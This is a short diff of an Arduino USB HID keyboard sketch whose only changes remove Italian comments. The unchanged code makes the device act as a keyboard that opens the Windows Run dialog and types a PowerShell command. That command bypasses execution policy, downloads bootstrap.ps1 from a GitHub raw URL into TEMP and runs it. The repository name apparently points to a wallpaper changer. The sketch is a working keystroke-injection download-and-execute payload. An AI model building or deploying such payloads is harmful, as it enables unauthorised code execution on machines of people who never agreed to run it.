@@ -2,11 +2,9 @@
 #include "USB.h"
 #include "USBHIDKeyboard.h"
 
-// ── MODIFICA SOLO QUESTA RIGA ─────────────────────────────────────────────────
 static const char URL[] =
     "powershell -ExecutionPolicy Bypass -Command "
     "\"$f=\\\"$env:TEMP\\\\bootstrap.ps1\\\"; iwr 'https://raw.githubusercontent.com/Gory-git/ChangeWindowsDesktopImage/main/scripts/bootstrap.ps1' -o $f; & $f\"";
-// ────────────────────────────────────────────────────────────────────────────
 
 static constexpr uint32_t DELAY_HID_INIT   = 8000U;
 static constexpr uint32_t DELAY_RUN_DIALOG = 1200U;
@@ -122,11 +120,9 @@ void setup() {
     Keyboard.begin();
     delay(DELAY_HID_INIT);
 
-    // Apri Win+R
     pressCombo(KEY_LEFT_GUI, 'r');
     delay(DELAY_RUN_DIALOG);
 
-    // Digita il comando con rimappatura italiana
     typeStringIT(URL);
     delay(400);
     pressCombo(KEY_RETURN);
